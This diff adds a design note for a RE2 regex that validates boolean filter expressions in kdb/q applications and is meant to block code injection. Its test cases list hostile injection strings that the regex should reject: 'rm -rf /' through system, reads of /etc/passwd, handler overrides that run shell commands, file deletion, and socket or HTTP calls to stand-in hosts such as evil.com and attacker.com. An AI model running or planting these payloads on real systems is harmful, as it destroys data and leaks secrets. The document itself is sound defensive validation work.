@@ -1,0 +1,150 @@
+# Boolean Expression Validator for kdb/q Security
+
+This document summarizes the development of a regular expression pattern to validate boolean expressions for preventing code injection in kdb/q applications.
+
+## Regular Expression Pattern
+
+The following RE2-compatible regular expression validates boolean expressions consisting of field comparisons connected by AND, OR, NOT operators and grouped with parentheses, while preventing code injection:
+
+```regex
+(?i)^(?:(?:NOT\s+)?(?:(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\)))|(?:\(\s*(?:(?:NOT\s+)?(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\)))(?:\s+(?:AND|OR)\s+(?:NOT\s+)?(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\))))*\s*\)))(?:\s+(?:AND|OR)\s+(?:(?:NOT\s+)?(?:(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\)))|(?:\(\s*(?:(?:NOT\s+)?(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\)))(?:\s+(?:AND|OR)\s+(?:NOT\s+)?(?:(?:[a-zA-Z_][a-zA-Z0-9_]*)\s+(?:=|!=|<>|>|<|>=|<=|LIKE|IN|NOT\s+IN|IS|IS\s+NOT)\s+(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+|\(\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+)(?:\s*,\s*(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|-?\d+(?:\.\d+)?|NULL|TRUE|FALSE|`[a-zA-Z0-9_]+))*\s*\))))*\s*\)))))*$
+```
+
+## Pattern Components
+
+The regex validates expressions with the following components:
+
+1. **Field Names**: Identifiers that begin with a letter or underscore, followed by alphanumeric characters or underscores.
+   - Example: `field_name123`
+
+2. **Comparison Operators**:
+   - Equal: `=`
+   - Not equal: `!=`, `<>`
+   - Greater than/less than: `>`, `<`
+   - Greater than or equal/less than or equal: `>=`, `<=`
+   - Pattern matching: `LIKE`
+   - Membership testing: `IN`, `NOT IN`
+   - NULL checking: `IS`, `IS NOT`
+
+3. **Literals**:
+   - String literals: `'text'` or `"text"` (with proper escape handling)
+   - Number literals: `123` or `123.45`
+   - Boolean literals: `TRUE`, `FALSE`
+   - NULL literal: `NULL`
+   - kdb/q symbols: `` `symbol ``
+   - Lists for IN operators: `(1, 2, 3)` or `('a', 'b', 'c')` or `` (`sym1, `sym2) ``
+
+4. **Boolean Operators**:
+   - Conjunction: `AND`
+   - Disjunction: `OR`
+   - Negation: `NOT`
+
+5. **Grouping**:
+   - Parentheses for complex expressions: `(expr1) AND (expr2)`
+
+## Valid Expression Examples
+
+The regex will match valid boolean expressions such as:
+
+```
+field1 > 5
+field1 > 5 AND field2 = 'text'
+(field1 > 5 OR field2 = 'text') AND field3 != NULL
+NOT (field1 <= 10)
+field1 LIKE '%pattern%'
+field1 IN (1, 2, 3)
+symbol = `abc
+column IN (`one, `two, `three)
+(name = `john) AND (age > 30)
+((field1 > 5) OR (field2 = 'text')) AND (field3 != NULL)
+```
+
+## Injection Attack Test Cases
+
+The following test cases represent various code injection attempts that should be rejected:
+
+### 1. User Defining and Executing a Function
+
+```
+# Function definition attempts
+field = {x+1}
+field1 > 5 AND name = {[x] `$x}
+column IN (`test; {x*x})
+age > 18 OR status = {system "rm -rf /"}
+field1 LIKE '%pattern%' AND {[x;y] x+y}[1;2]
+(field1 = 10) AND (field2 = {.z.exit 0})
+
+# Function execution attempts
+field1 = .z.exit[0]
+field1 > 5 AND field2 = system["ls -la"]
+symbol = eval("field1+field2")
+username = .Q.fu[{`admin}]
+field1 IN (`a; eval "1+1")
+(age > 18) OR (name = value "malicious")
+```
+
+### 2. User Setting a Global Variable
+
+```
+# Global variable assignments
+.z.ps:{system "rm *"}
+field1 > 5 AND (.z.exit:0)
+`field1 set 10
+field1 = 'value' AND .myGlobal:42
+((field1 = 10) OR (field2 = 20)) AND @[`.;`dangerous;:;{system "rm *"}]
+name LIKE 'J%' AND .[`$"global"; (); :; 100]
+
+# Modifying system variables
+field1 = 10 AND .z.pg:{x}
+username = 'admin' AND (.z.pp:{0N!x})
+field1 IN (`one, `two) AND (.z.open:{`a set x})
+```
+
+### 3. User Reading or Writing to a File or Socket
+
+```
+# File operations
+field1 = read0 `:password.txt
+username = hopen `:config.cfg
+field1 > 5 AND (field2 = hsym `$"/etc/passwd")
+value = get `:secure_file.q
+field1 = 'data' AND hclose hdel `:important.file
+
+# Socket/network operations
+field1 > 5 AND (field2 = hopen `:tcps://evil.com:9999)
+name = .Q.hp["http://malicious.com"]
+(field1 = 10) OR (field2 = .Q.hg "http://attacker.com")
+age > 18 AND (status = .Q.addr `a.b.c.d)
+field1 IN (`a,`b) AND (-36!("localhost";9999))
+```
+
+### Mixed/Complex Injection Attempts
+
+```
+# Combining multiple attack vectors
+field1 = `test; system "rm -rf /"
+name = 'John' AND .z.exit 0
+field1 > 5 OR {system "cat /etc/passwd"}[]
+field1 = (hopen `:secret.txt) AND field2 = 'data'
+field1 LIKE '%xxx%'; .z.pg:{system x}
+(field1 = 10) OR (field2 IN (`a,`b)); .Q.hdel `:important
+age > 18 AND eval "hopen `:malicious.q"
+```
+
+## Implementation Notes
+
+1. The regex is designed to be compatible with Google's RE2 engine.
+2. Case insensitivity for keywords (AND, OR, NOT, NULL, TRUE, FALSE) is handled with (?i) flag.
+3. While the regex can handle nested expressions, extremely complex deeply nested expressions may push the limits of what a single regex can validate.
+4. For additional security, it is recommended to:
+   - Validate field names against a list of allowed columns
+   - Apply appropriate permissions at the database level
+   - Log and monitor validation failures for potential attack attempts
+
+## Limitations
+
+1. Regular expressions cannot validate balanced parentheses beyond a certain nesting depth.
+2. The regex provides a solid defense but should be part of a layered security approach.
+3. No error reporting is provided (only valid/invalid determination).
+
+For extremely complex expressions or when detailed error reporting is needed, a parser-based approach would be more appropriate. However, for most practical use cases, this regex validation should provide effective protection against code injection attempts in kdb/q systems.
